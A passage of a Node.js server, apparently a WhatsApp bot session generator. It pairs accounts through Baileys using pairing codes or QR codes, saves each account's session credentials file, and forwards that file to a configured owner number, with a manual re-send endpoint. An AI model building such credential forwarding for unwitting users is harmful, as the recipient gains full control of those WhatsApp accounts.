        return { ok: false, status: 'delivery_failed', method: 'qr', botNumber: entry.botNumber, region: entry.region, error: entry.deliveryError || 'Gagal mengirim sesi ke owner.' }
      }
      if (entry.status === 'awaiting_qr' && entry.qrDataUrl) {
        return {
          ok: true, status: 'awaiting_qr', method: 'qr',
          qrDataUrl: entry.qrDataUrl, expiresIn: QR_TTL_SECONDS, region: entry.region
        }
      }
      if (entry.status === 'connected') {
        return { ok: true, status: 'connected', method: 'qr', botNumber: entry.botNumber, region: entry.region }
      }
      await delay(500)
    }
    return {
      ok: true, status: 'connecting', method: 'qr', region: entry.region,
      note: 'QR belum terbit — tunggu sebentar, QR akan muncul otomatis via WebSocket.'
    }
  }

  // ── Mode Pairing: GATE (browserSwitch.js V1), tunggu WS OPEN dulu ──
  // sock.ws adalah WebSocketClient Baileys, TIDAK punya .readyState —
  // yang dicek adalah sock.ws?.isOpen, setelah delay ~5 detik.
  let lastError = null
  for (let attempt = 1; attempt <= 3; attempt++) {
    // Bot sudah terhubung / sedang dikirim / sudah terkirim -> jangan minta kode lagi.
    if (['connected', 'delivering', 'delivered_disconnected', 'delivery_failed'].includes(entry.status)) break
    if (state.creds?.registered) break
    await delay(5000)
    if (['connected', 'delivering', 'delivered_disconnected', 'delivery_failed'].includes(entry.status)) break
    if (!sock.ws?.isOpen) {
      lastError = new Error('Socket WhatsApp belum terbuka (belum OPEN).')
      console.warn(`[SessionBot] Percobaan ${attempt}/3: ws belum open, tunggu socket berikutnya`)
      continue
    }
    if (entry.pairingRequested) break
    entry.pairingRequested = true
    try {
      const code = await sock.requestPairingCode(phone, entry.pairingCode)
      const formatted = formatPairingCode(code)
      entry.code = formatted
      entry.status = 'awaiting_code'
      startExpireTimer(entry, phone, CODE_TTL_SECONDS, () => {
        if (entry.status === 'awaiting_code') {
          entry.status = 'expired'
          entry.code = null
          entry.expiresAt = null
          console.log(`[SessionBot] Kode ${phone} kadaluarsa (3 menit)`)
        }
      })
      console.log(`[SessionBot] Pairing code terbit untuk ${phone} (berlaku ${CODE_TTL_SECONDS} detik)`)
      broadcastStatus(phone)
      return { ok: true, status: 'awaiting_code', method: 'pairing', code: formatted, expiresIn: CODE_TTL_SECONDS, region: entry.region }
    } catch (err) {
      lastError = err
      const msg = String(err?.message || err)
      // Connection Closed / 408: reset flag supaya socket berikutnya bisa coba lagi.
      if (/connection closed|408/i.test(msg)) {
        entry.pairingRequested = false
        console.warn(`[SessionBot] requestPairingCode kena ${msg} — reset flag, coba lagi`)
        await delay(2000)
        continue
      }
      entry.pairingRequested = false
      break
    }
  }

  // Bot keburu terhubung saat loop berjalan -> kembalikan status akhirnya
  // (pengiriman ke owner berjalan / sudah selesai di handler 'open').
  if (entry.status === 'delivered_disconnected') {
    return { ok: true, status: 'delivered_disconnected', method: 'pairing', botNumber: entry.botNumber, region: entry.region, delivery: entry.delivery || (await readDeliveryMarker(phone)) }
  }
  if (entry.status === 'delivery_failed') {
    return { ok: false, status: 'delivery_failed', method: 'pairing', botNumber: entry.botNumber, region: entry.region, error: entry.deliveryError || 'Gagal mengirim sesi ke owner.' }
  }
  if (entry.status === 'connected' || entry.status === 'delivering') {
    return { ok: true, status: entry.status, method: 'pairing', botNumber: entry.botNumber, region: entry.region }
  }
  entry.status = entry.status === 'awaiting_code' ? 'awaiting_code' : 'connecting'
  broadcastStatus(phone)
  return {
    ok: false,
    status: entry.status,
    method: 'pairing',
    region: entry.region,
    error: lastError
      ? `Gagal meminta pairing code: ${lastError.message || lastError}. Coba lagi beberapa detik — socket WhatsApp mungkin masih connecting / kena 408.`
      : 'Gagal meminta pairing code. Coba lagi.'
  }
}

async function closeSession(phone) {
  const entry = sessions.get(phone)
  if (!entry) return
  clearExpireTimer(entry)
  try { entry.sock?.ev?.removeAllListeners() } catch {}
  try { entry.sock?.ws?.close() } catch {}
  sessions.delete(phone)
  broadcast({ type: 'status', phone, status: 'idle', method: entry.method || 'pairing', code: null, qrDataUrl: null, expiresIn: 0, botNumber: null })
}

// ---------- HTTP + WS ----------
const app = express()
app.use(express.json({ limit: '64kb' }))
// ?view= di URL menyimpan pilihan ke cookie (1 tahun) supaya tampilan
// menetap di semua halaman + refresh, tanpa query menempel di URL.
app.use((req, res, next) => {
  const v = String(req.query.view || '').toLowerCase()
  if (v === 'mobile' || v === 'desktop') {
    res.cookie(VIEW_COOKIE, v, { maxAge: 365 * 24 * 3600 * 1000, path: '/', sameSite: 'Lax' })
  }
  next()
})
// /tutorial didaftarkan SEBELUM express.static: folder public/tutorial/
// tidak ada di build baru, tapi route ini tetap menang bila ada file.
app.get('/tutorial', (req, res) => serveViewPage('tutorial.html', req, res))
// Data Info Update: kata-kata tersimpan di folder INFO_UPDATE/update.json
// (bukan di public) — disajikan apa adanya supaya halaman /info-update
// selalu membaca file yang sama.
app.use('/INFO_UPDATE', express.static(path.join(ROOT, 'INFO_UPDATE')))
// Halaman baru per kategori (toolbar ala panel): /status + /tentang.
// Satu file HTML, stylesheet disuntik server sesuai tampilan (mobile/desktop).
async function serveViewPage(file, req, res) {
  const css = pickView(req) === 'mobile' ? '/mobile.css?v=16' : '/desktop.css?v=16'
  try {
    const html = await readFile(path.join(PUBLIC_DIR, file), 'utf8')
    res.type('html').send(html.replaceAll('{{VIEW_CSS}}', css))
  } catch {
    res.status(404).send('Halaman tidak ditemukan.')
  }
}
app.get('/status', (req, res) => serveViewPage('status.html', req, res))
app.get('/tentang', (req, res) => serveViewPage('tentang.html', req, res))
app.get('/info-update', (req, res) => serveViewPage('info-update.html', req, res))
// ---------- pilih tampilan: mobile & desktop KEPISAH ----------
//   Urutan: ?view=mobile|desktop (sekali pakai, ikut tersimpan ke cookie)
//   -> cookie sessionbot-view -> deteksi User-Agent.
//   Mobile -> public/mobile.html + mobile.css,
//   desktop -> public/index.html + desktop.css. app.js sama untuk keduanya.
const VIEW_COOKIE = 'sessionbot-view'
function viewFromCookie(req) {
  const m = String(req.headers.cookie || '').match(/(?:^|;\s*)sessionbot-view=(mobile|desktop)/)
  return m ? m[1] : ''
}
function pickView(req) {
  const v = String(req.query.view || '').toLowerCase()
  if (v === 'mobile' || v === 'desktop') return v
  const c = viewFromCookie(req)
  if (c) return c
  const ua = String(req.headers['user-agent'] || '')
  return /mobi|android|iphone|ipad|ipod|windows phone/i.test(ua) ? 'mobile' : 'desktop'
}
// Didaftarkan SEBELUM express.static supaya '/' tidak diambil alih index.html statis.
app.get(['/', '/index.html'], (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, pickView(req) === 'mobile' ? 'mobile.html' : 'index.html'))
})
app.get('/mobile.html', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'mobile.html')))
app.use(express.static(PUBLIC_DIR))

// ---------- pengunjung footer ----------
//   Online    = pengunjung yang sedang membuka web (heartbeat < 60 detik)
//   Stalker   = pengunjung 5 menit terakhir yang belum pernah pairing
//   Kunjungan = total pengunjung unik sejak server start (in-memory, reset
//               saat restart — bukan angka permanen seperti panel).
const visitors = new Map() // visitorId -> { lastSeen, paired }
const visitsEver = new Set()
function liveStats() {
  const now = Date.now()
  let online = 0
  let stalker = 0
  for (const v of visitors.values()) {
    if (now - v.lastSeen < 60000) online++
    if (now - v.lastSeen < 5 * 60000 && !v.paired) stalker++
  }
  return { online, stalker, visits: visitsEver.size }
}
app.post('/api/visitor/heartbeat', (req, res) => {
  const id = String(req.body?.visitorId || '').slice(0, 64)
  if (!id) return res.status(400).json({ ok: false, error: 'visitorId wajib diisi.' })
  const paired = req.body?.paired === true
  const prev = visitors.get(id)
  visitors.set(id, { lastSeen: Date.now(), paired: prev?.paired || paired })
  visitsEver.add(id)
  // Bersihkan entri lama (>10 menit) supaya Map tidak membesar.
  for (const [k, v] of visitors) if (Date.now() - v.lastSeen > 10 * 60000) visitors.delete(k)
  res.json({ ok: true, ...liveStats() })
})
app.get('/api/public/live-stats', (_req, res) => res.json({ ok: true, ...liveStats() }))

// ---------- Uptime persisten ----------
// Uptime TIDAK reset saat server restart — total detik terakumulasi di
// data/uptime.json, jadi "web berjalan" terus bertambah walau server restart.
const UPTIME_DIR = path.join(__dirname, 'data')
const UPTIME_FILE = path.join(UPTIME_DIR, 'uptime.json')
let uptimeBaseSeconds = 0
try {
  if (existsSync(UPTIME_FILE)) {
    const saved = JSON.parse(readFileSync(UPTIME_FILE, 'utf8'))
    if (saved && Number.isFinite(saved.totalSeconds)) uptimeBaseSeconds = Math.max(0, Math.floor(saved.totalSeconds))
  }
} catch (e) { uptimeBaseSeconds = 0 }
const serverStartedAt = Date.now()
function totalUptimeSeconds() { return uptimeBaseSeconds + Math.floor((Date.now() - serverStartedAt) / 1000) }
function saveUptime() {
  try {
    mkdirSync(UPTIME_DIR, { recursive: true })
    writeFileSync(UPTIME_FILE, JSON.stringify({ totalSeconds: totalUptimeSeconds(), savedAt: new Date().toISOString() }, null, 2) + '\n')
  } catch (e) { /* jangan pernah matikan server gara-gara uptime */ }
}
setInterval(saveUptime, 10000).unref()
process.on('SIGINT', () => { saveUptime(); process.exit(0) })
process.on('SIGTERM', () => { saveUptime(); process.exit(0) })

app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    app: 'SessionBot',
    botVersion: config.botVersion,
    browser: getBrowserLabel(config),
    pairedBrowserKey: config.pairedBrowserKey || 'v1',
    methods: ['pairing', 'qr'],
    codeTtlSeconds: CODE_TTL_SECONDS,
    qrTtlSeconds: QR_TTL_SECONDS,
    sessionName: SESSION_FILE_NAME,
    sessionDir: 'sessions',
    sessionFile: 'sessions/<nomor>/hisoka.json',
    ownerNumber: OWNER_NUMBER,
    sendSessionToOwner: SEND_SESSION_TO_OWNER,
    activeSessions: sessions.size,
    uptimeSeconds: totalUptimeSeconds(),
    uptimeSinceRestartSeconds: Math.floor(process.uptime()),
    startedAt: new Date(serverStartedAt).toISOString(),
    node: process.version,
    platform: process.platform,
    memory: { rss: process.memoryUsage().rss, heapUsed: process.memoryUsage().heapUsed, heapTotal: process.memoryUsage().heapTotal, systemTotal: os.totalmem(), systemFree: os.freemem() },
    cpu: { count: os.cpus().length, loadavg: os.loadavg().map(function (n) { return Math.round(n * 100) / 100 }) }
  })
})

app.get('/api/session/status', async (req, res) => {
  const v = validatePhone(req.query.phone || '')
  if (!v.ok) return res.json({ ok: false, error: v.error })
  const entry = sessions.get(v.phone)
  const fileExists = existsSync(sessionFileFor(v.phone))
  // Sesi live sudah ditutup setelah terkirim -> tampilkan catatan delivered.
  const delivered = !entry ? deliveredByPhone.get(v.phone) : null
  const delivery = entry?.delivery || delivered?.delivery || (await readDeliveryMarker(v.phone))
  // Metadata ASLI file sesi (hanya jumlah/ukuran/flag — tanpa isi kunci),
  // dibaca fresh tiap status poll; disimpan ke entry agar broadcast WS ikut.
  const info = await getSessionInfo(v.phone)
  if (entry) entry.sessionChecklist = sessionChecklist(info)
  res.json({
    ok: true,
    phone: v.phone,
    region: v.region || detectRegionFull(v.phone),
    status: entry?.status || delivered?.status || 'idle',
    method: entry?.method || delivered?.method || 'pairing',
    code: entry?.status === 'awaiting_code' ? entry.code : null,
    qrDataUrl: entry?.status === 'awaiting_qr' ? entry.qrDataUrl : null,
    expiresIn: entry?.expiresAt ? Math.max(0, Math.ceil((entry.expiresAt - Date.now()) / 1000)) : 0,
    botNumber: entry?.botNumber || delivered?.botNumber || null,
    hasSessionFile: fileExists,
    sessionName: SESSION_FILE_NAME,
    sessionFile: `sessions/${v.phone}/${SESSION_FILE_NAME}`,
    delivery: delivery && delivery.phone === v.phone ? delivery : null,
    deliveryError: entry?.deliveryError || null,
    session: sessionChecklist(info)
  })
})

// Info hisoka.json nomor itu setelah tersambung — tanpa kunci rahasia.
// WAJIB query ?phone= (nomor divalidasi seperti route lain).
app.get('/api/session/hisoka', async (req, res) => {
  const v = validatePhone(req.query.phone || '')
  if (!v.ok) return res.status(400).json({ ok: false, error: v.error })
  const info = await getSessionInfo(v.phone)
  const delivery = await readDeliveryMarker(v.phone)
  res.json({ ok: true, ...info, delivery })
})

// Kirim ulang hisoka.json nomor itu ke owner secara manual.
// Syarat: bot sedang terhubung (status connected) + hisoka.json lengkap.
// Tanpa {force:true}, tidak kirim ulang bila marker sudah cocok.
app.post('/api/session/send-to-owner', async (req, res) => {
  const v = validatePhone(req.body?.phone || '')
  if (!v.ok) return res.status(400).json({ ok: false, error: v.error })
  const phone = v.phone
  const force = req.body?.force === true
  const entry = sessions.get(phone)
  if (!entry || !entry.sock) {
    const delivered = deliveredByPhone.get(phone)
    if (delivered) {
      return res.json({ ok: true, status: 'delivered_disconnected', delivery: delivered.delivery, note: 'Sesi sudah terkirim ke owner dan sesi web sudah terputus.' })
    }
    return res.status(409).json({ ok: false, error: 'Bot belum terhubung — pairing dulu sebelum kirim sesi ke owner.' })
  }
  if (entry.status === 'delivering') {
    return res.status(409).json({ ok: false, status: 'delivering', error: 'Pengiriman sesi sedang berjalan — tunggu sampai selesai.' })
  }
  if (entry.status !== 'connected') {
    return res.status(409).json({ ok: false, status: entry.status, error: `Bot belum terhubung (status: ${entry.status}) — kirim ke owner hanya bisa setelah connected.` })
  }
  const result = await deliverSessionToOwner(entry.sock, phone, { force })
  if (!result.ok) return res.status(502).json(result)
  return res.json(result)
})

app.post('/api/pairing/request', async (req, res) => {
  const v = validatePhone(req.body?.phone || '')
  if (!v.ok) return res.status(400).json({ ok: false, error: v.error })
  const phone = v.phone
  const method = req.body?.method === 'qr' ? 'qr' : 'pairing' // method wajib, default pairing
  // Step 3 (hanya mode pairing): custom 8 karakter atau acak.
  // Validasi di sini SEBELUM socket dibuat — kode custom kosong ditolak 400;
  // 1–7 karakter diisi '0' di belakang (aturan V1), bukan ditolak.
  const codeMode = method === 'pairing'
    ? (req.body?.codeMode === 'random' ? 'random' : req.body?.codeMode === 'custom' ? 'custom' : undefined)
    : undefined
  let pairingCode
  if (method === 'pairing' && codeMode) {
    const resolved = resolvePairingCode(codeMode, req.body?.customCode)
    if (resolved.error) return res.status(400).json({ ok: false, error: resolved.error })
    pairingCode = resolved.code
  }

  const existing = sessions.get(phone)
  if (existing?.status === 'awaiting_code' && method === 'pairing' && existing.code && existing.expiresAt > Date.now()) {
    return res.json({
      ok: true, status: 'awaiting_code', method: 'pairing', code: existing.code,
      expiresIn: Math.ceil((existing.expiresAt - Date.now()) / 1000),
      region: v.region,
      note: 'Kode masih berlaku, pakai kode yang sama.'
    })
  }
  if (existing?.status === 'awaiting_qr' && method === 'qr' && existing.qrDataUrl && existing.expiresAt > Date.now()) {
    return res.json({
      ok: true, status: 'awaiting_qr', method: 'qr', qrDataUrl: existing.qrDataUrl,
      expiresIn: Math.ceil((existing.expiresAt - Date.now()) / 1000),
      region: v.region,
      note: 'QR masih berlaku, pakai QR yang sama.'
    })
  }
  if (existing?.status === 'connected') {
    return res.json({ ok: true, status: 'connected', method, botNumber: existing.botNumber, region: v.region, note: 'Nomor ini sudah tertaut.' })
  }
  // Pengiriman sesi ke owner sedang berjalan — jangan matikan socket-nya.
  if (existing?.status === 'delivering') {
    return res.status(409).json({ ok: false, status: 'delivering', error: 'Sesi sedang dikirim ke owner — tunggu sampai selesai.' })
  }
  // Kalau sesi web sudah terputus setelah terkirim (delivered_disconnected),
  // request baru lanjut ke createSocketAndPair: hisoka.json nomor ini sudah
  // registered, socket dibuat lagi dan delivery dicek ulang
  // (tidak kirim ulang bila marker cocok dengan file).
  // Kalau ada socket lama yang masih connecting / method-nya beda, tutup dulu.
  if (existing?.sock) await closeSession(phone)

  try {
    const result = await createSocketAndPair(phone, method, { codeMode, code: pairingCode })
    if (!result.ok) {
      return res.status(502).json(result)
    }
    return res.json(result)
  } catch (err) {
    console.error('[SessionBot] /api/pairing/request error:', err)
    return res.status(500).json({ ok: false, error: `Terjadi kesalahan server: ${err?.message || err}` })
  }
})

app.post('/api/pairing/cancel', async (req, res) => {
  const v = validatePhone(req.body?.phone || '')
  if (!v.ok) return res.status(400).json({ ok: false, error: v.error })
  await closeSession(v.phone)
  return res.json({ ok: true, status: 'idle', note: 'Permintaan pairing dibatalkan.' })
})

app.post('/api/pairing/logout', async (req, res) => {
  const v = validatePhone(req.body?.phone || '')
  if (!v.ok) return res.status(400).json({ ok: false, error: v.error })
  await closeSession(v.phone)
  await deleteSessionFiles(v.phone)
  return res.json({ ok: true, status: 'idle', note: 'Sesi dihapus. Silakan minta pairing code / QR baru bila ingin menautkan lagi.' })
})

app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, pickView(req) === 'mobile' ? 'mobile.html' : 'index.html'))
})

const server = http.createServer(app)
const wss = new WebSocketServer({ server })
wss.on('connection', (ws) => {
  wsClients.add(ws)
  ws.send(JSON.stringify({ type: 'hello', app: 'SessionBot', codeTtlSeconds: CODE_TTL_SECONDS, qrTtlSeconds: QR_TTL_SECONDS }))
  ws.on('close', () => wsClients.delete(ws))
  ws.on('error', () => wsClients.delete(ws))
})

server.listen(PORT, () => {
  console.log(`[SessionBot] Jalan di http://localhost:${PORT}`)
  console.log(`[SessionBot] Browser: ${getBrowserLabel(config)} (pairedBrowserKey: ${config.pairedBrowserKey || 'v1'}) | Kode ${CODE_TTL_SECONDS} detik, QR ${QR_TTL_SECONDS} detik`)
  // Agen proxy WhatsApp: aktif = socket Baileys lewat egress proxy VM
  // (tanpa ini socket mati 408). URL proxy TIDAK pernah di-log.
  console.log(`[SessionBot] Agen proxy WhatsApp: ${getWhatsAppProxyAgent() ? 'aktif (socket lewat proxy VM)' : 'tidak ada proxy (koneksi langsung)'}`)
})
